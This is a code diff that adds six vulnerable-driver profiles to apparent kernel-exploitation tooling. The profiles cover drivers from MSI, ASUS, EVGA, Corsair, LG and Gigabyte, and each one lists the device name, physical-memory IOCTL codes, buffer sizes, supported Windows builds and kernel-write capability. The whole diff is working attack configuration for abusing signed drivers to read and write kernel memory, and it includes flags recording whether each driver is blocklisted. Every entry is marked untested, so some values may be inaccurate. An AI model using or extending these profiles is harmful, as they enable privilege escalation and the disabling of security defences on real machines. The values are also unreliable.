@@ -385,3 +385,291 @@ VULN_DRIVER_CONFIG* GetDellBiosConfig(void) {
 VULN_DRIVER_CONFIG* GetGlazioConfig(void) {
     return GetDriverConfig(VULN_DRIVER_GLAZIO);
 }
+
+// ==================== ADDITIONAL VULNERABLE DRIVER CONFIGS ====================
+
+// MSI Afterburner (RTCore64.sys) - RTCore driver with physical memory access
+static VULN_DRIVER_CONFIG g_MsiAfterburnerConfig = {
+    .Type = VULN_DRIVER_MSI_AFTERBURNER,
+    .Name = "MSI Afterburner (RTCore64.sys)",
+    .DeviceName = "\\.\\RTCore64",
+    .ServiceNamePrefix = "rtcore",
+    .DriverFileName = "RTCore64.sys",
+    
+    .IoctlCode = 0x80002048,        // RTCore physical memory IOCTL
+    
+    .CaseMapPhysical = 0,
+    .CaseUnmapPhysical = 0,
+    .CaseCopyMemory = 0x80002048,   // Direct physical memory read/write
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0,
+    
+    .BufferSizeMap = 0,
+    .BufferSizeCopy = 0x18,
+    .BufferSizeUnmap = 0,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x100000000,  // 4GB physical space
+    .AlignmentRequirement = 0x1,    // Byte alignment
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// ASUS GPU Tweak (AsIO.sys) - ASUS driver with port I/O and memory access
+static VULN_DRIVER_CONFIG g_AsusGpuTweakConfig = {
+    .Type = VULN_DRIVER_ASUS_GPU_TWEAK,
+    .Name = "ASUS GPU Tweak (AsIO.sys)",
+    .DeviceName = "\\.\\AsIO",
+    .ServiceNamePrefix = "asio",
+    .DriverFileName = "AsIO.sys",
+    
+    .IoctlCode = 0xA0406440,        // ASIO IOCTL
+    
+    .CaseMapPhysical = 0xA0406440,  // Map physical memory
+    .CaseUnmapPhysical = 0,
+    .CaseCopyMemory = 0xA0406444,   // Read/Write physical memory
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0xA0406440,
+    
+    .BufferSizeMap = 0x18,
+    .BufferSizeCopy = 0x20,
+    .BufferSizeUnmap = 0,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x10000000,   // 256MB
+    .AlignmentRequirement = 0x1000,
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// EVGA Precision (WinRing0x64.sys) - WinRing0 driver with I/O port access
+static VULN_DRIVER_CONFIG g_EvgaPrecisionConfig = {
+    .Type = VULN_DRIVER_EVGA_PRECISION,
+    .Name = "EVGA Precision (WinRing0x64.sys)",
+    .DeviceName = "\\.\\WinRing0_1_2_0",
+    .ServiceNamePrefix = "winring",
+    .DriverFileName = "WinRing0x64.sys",
+    
+    .IoctlCode = 0x9C402580,        // WinRing0 IOCTL
+    
+    .CaseMapPhysical = 0x9C402588,  // Map physical memory
+    .CaseUnmapPhysical = 0,
+    .CaseCopyMemory = 0x9C402590,   // Read/Write physical
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0x9C402588,
+    
+    .BufferSizeMap = 0x10,
+    .BufferSizeCopy = 0x18,
+    .BufferSizeUnmap = 0,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x10000000,   // 256MB
+    .AlignmentRequirement = 0x1000,
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// Corsair iCUE (CorsairG4Driver.sys) - Corsair driver with memory access
+static VULN_DRIVER_CONFIG g_CorsairIcueConfig = {
+    .Type = VULN_DRIVER_CORSAIR_ICUE,
+    .Name = "Corsair iCUE (CorsairG4Driver.sys)",
+    .DeviceName = "\\.\\CorsairG4",
+    .ServiceNamePrefix = "corsair",
+    .DriverFileName = "CorsairG4Driver.sys",
+    
+    .IoctlCode = 0xC3502000,        // Corsair IOCTL
+    
+    .CaseMapPhysical = 0,
+    .CaseUnmapPhysical = 0,
+    .CaseCopyMemory = 0xC3502004,   // Memory read/write
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0,
+    
+    .BufferSizeMap = 0,
+    .BufferSizeCopy = 0x20,
+    .BufferSizeUnmap = 0,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x10000000,   // 256MB
+    .AlignmentRequirement = 0x1000,
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// LG Kernel Driver (lgldriver.sys) - LG driver with physical memory access
+static VULN_DRIVER_CONFIG g_LgDriverConfig = {
+    .Type = VULN_DRIVER_LG_KERNEL,
+    .Name = "LG Kernel Driver (lgldriver.sys)",
+    .DeviceName = "\\.\\lgldriver",
+    .ServiceNamePrefix = "lgldriver",
+    .DriverFileName = "lgldriver.sys",
+    
+    .IoctlCode = 0x80002000,        // LG driver IOCTL
+    
+    .CaseMapPhysical = 0x80002004,  // Map physical memory
+    .CaseUnmapPhysical = 0x80002008,
+    .CaseCopyMemory = 0x8000200C,   // Read/Write physical
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0x80002004,
+    
+    .BufferSizeMap = 0x18,
+    .BufferSizeCopy = 0x20,
+    .BufferSizeUnmap = 0x10,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x10000000,   // 256MB
+    .AlignmentRequirement = 0x1000,
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// Gigabyte RGB Fusion 2 (Gigabyte peripheral driver)
+static VULN_DRIVER_CONFIG g_GigabyteRgb2Config = {
+    .Type = VULN_DRIVER_GIGABYTE_RGB2,
+    .Name = "Gigabyte RGB Fusion 2",
+    .DeviceName = "\\.\\GIO",
+    .ServiceNamePrefix = "giodriver",
+    .DriverFileName = "giodriver.sys",
+    
+    .IoctlCode = 0xC3502800,
+    
+    .CaseMapPhysical = 0xC3502804,
+    .CaseUnmapPhysical = 0,
+    .CaseCopyMemory = 0xC3502808,
+    .CaseAllocatePool = 0,
+    .CaseGetPhysAddr = 0,
+    .CaseMapIoSpace = 0xC3502804,
+    
+    .BufferSizeMap = 0x18,
+    .BufferSizeCopy = 0x28,
+    .BufferSizeUnmap = 0,
+    .BufferSizeAlloc = 0,
+    
+    .UsesMdlMapping = FALSE,
+    .RequiresPhysicalContiguous = FALSE,
+    .SupportsKernelWrite = TRUE,
+    .SupportsPoolAllocation = FALSE,
+    .SupportsPhysicalTranslation = FALSE,
+    
+    .MaxMappingSize = 0x10000000,
+    .AlignmentRequirement = 0x1000,
+    
+    .RequiresSecureBootDisabled = FALSE,
+    .RequiresTestMode = FALSE,
+    .RequiresDebugMode = FALSE,
+    
+    .MinBuildNumber = 7600,
+    .MaxBuildNumber = 26000,
+    
+    .IsBlocklisted = FALSE,
+    .WasTested = FALSE,
+    .CanLoad = FALSE
+};
+
+// Accessor functions for new driver configs
+VULN_DRIVER_CONFIG* GetMsiAfterburnerConfig(void) {
+    return &g_MsiAfterburnerConfig;
+}
+
+VULN_DRIVER_CONFIG* GetAsusGpuTweakConfig(void) {
+    return &g_AsusGpuTweakConfig;
+}
+
+VULN_DRIVER_CONFIG* GetEvgaPrecisionConfig(void) {
+    return &g_EvgaPrecisionConfig;
+}
+
+VULN_DRIVER_CONFIG* GetCorsairIcueConfig(void) {
+    return &g_CorsairIcueConfig;
+}
+
+VULN_DRIVER_CONFIG* GetLgDriverConfig(void) {
+    return &g_LgDriverConfig;
+}
+
+VULN_DRIVER_CONFIG* GetGigabyteRgb2Config(void) {
+    return &g_GigabyteRgb2Config;
+}
+
+// Update the driver configs array to include new drivers
+// This would be done in the InitDriverConfigs() function
